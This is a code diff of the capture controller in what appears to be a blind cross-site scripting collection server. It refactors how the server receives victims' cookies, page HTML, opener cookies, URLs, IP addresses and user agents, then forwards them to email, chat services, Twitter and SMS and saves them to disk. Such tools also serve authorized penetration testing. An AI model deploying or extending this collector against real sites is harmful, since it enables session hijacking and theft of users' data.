@@ -12,7 +12,7 @@ const ciscoTeams = require('../utilities/services/spark');
 const twitter = require('../utilities/services/twitter');
 const template = require('../utilities/templates/script');
 const payloads = require('../utilities/payloads');
-const check = require('../utilities/check');
+
 /* eslint-disable no-shadow */
 function reportToUtilities(guid, domain, config) {
   mail.sendMail(guid, domain, config);
@@ -22,26 +22,16 @@ function reportToUtilities(guid, domain, config) {
   twitter.sendTwitter(guid, domain, config);
 }
 
-function sendSmsAndSaveToDisk(check, domain, res, guid) {
-  // check if domain.URL exists or is not null/empty (should always be captured if valid request)
-  if (!check.folderOrFileExists() && !!domain.URL) {
-    if (!check.lastSms()) {
-      console.log(`Sending SMS For URL ${domain.URL}`);
-      sms.sendSMS(guid, domain, config, save);
-      console.log(`Saving To Disk URL ${domain.URL}`);
-      save.saveFile(guid, domain, config);
-      res.redirect(domain.URL);
-    } else {
-      res.redirect(domain.URL);
-      console.log('Already sent SMS today, saving to disk');
-      console.log(`Saving To Disk URL ${domain.URL}`);
-      save.saveFile(guid, domain, config);
-    }
-  } else {
-    console.log(`The domain ${domain.URL} already exists`);
-    console.log(`Saving To Disk URL ${domain.URL}`);
+function sendSmsAndSaveToDisk(domain, res, guid) {
+  if (!sms.lastSms()) {
+    console.log(`Sending SMS And Saving To Disk For URL ${domain.URL}`);
+    sms.sendSMS(guid, domain, config, save);
     save.saveFile(guid, domain, config);
     res.redirect(domain.URL);
+  } else {
+    res.redirect(domain.URL);
+    console.log(`Already Sent SMS Today, Saving To Disk For URL ${domain.URL}`);
+    save.saveFile(guid, domain, config);
   }
 }
 /* eslint-enable no-shadow */
@@ -64,46 +54,32 @@ exports.generatePayloads = (req, res) => {
 };
 
 exports.capture = (req, res) => {
-  if (req.body._) {
-    console.log(req.body._);
-    const domain = process.processDomain(req.body._, config);
-    domain.victimIP =
-      req.headers['x-forwarded-for'] ||
-      req.connection.remoteAddress ||
-      req.socket.remoteAddress ||
-      req.connection.socket.remoteAddress;
-    domain.userAgent = req.headers['user-agent'];
-    const guid = uuid();
-
-    // Always send to email, slack, webex teams, or discord
-    reportToUtilities(guid, domain, config);
-
-    // check if domain.URL exists or is not null/empty (should always be captured if valid request)
-    sendSmsAndSaveToDisk(check, domain, res, guid);
-  }
-};
-// Need to Rearchitecture this -- but simple PoC to-begin with.
-exports.httpGet = (req, res) => {
-  const domain = {
-    Cookie: 'null',
-    innerHTML: 'null',
-    URL: req.get('referer'),
-    openerLocation: 'null',
-    openerInnerHTML: 'null',
-    openerCookie: 'null',
-    hasSecurityTxt: 'null',
-    victimIP:
-      req.headers['x-forwarded-for'] ||
-      req.connection.remoteAddress ||
-      req.socket.remoteAddress ||
-      req.connection.socket.remoteAddress,
-    userAgent: req.headers['user-agent']
-  };
+  let domain = {};
   const guid = uuid();
+  if (req.body._) {
+    domain = process.processDomain(req.body._, config);
+  }
+  if (req.originalUrl === '/mH') {
+    domain = {
+      Cookie: 'null',
+      innerHTML: 'null',
+      URL: req.get('referer'),
+      openerLocation: 'null',
+      openerInnerHTML: 'null',
+      openerCookie: 'null',
+      hasSecurityTxt: 'null'
+    };
+  }
+  domain.victimIP =
+    req.headers['x-forwarded-for'] ||
+    req.connection.remoteAddress ||
+    req.socket.remoteAddress ||
+    req.connection.socket.remoteAddress;
+  domain.userAgent = req.headers['user-agent'];
+
+  // check if domain.URL exists or is not null/empty (should always be captured if valid request)
+  sendSmsAndSaveToDisk(domain, res, guid);
 
   // Always send to email, slack, webex teams, or discord
   reportToUtilities(guid, domain, config);
-
-  // check if domain.URL exists or is not null/empty (should always be captured if valid request)
-  sendSmsAndSaveToDisk(check, domain, res, guid);
 };
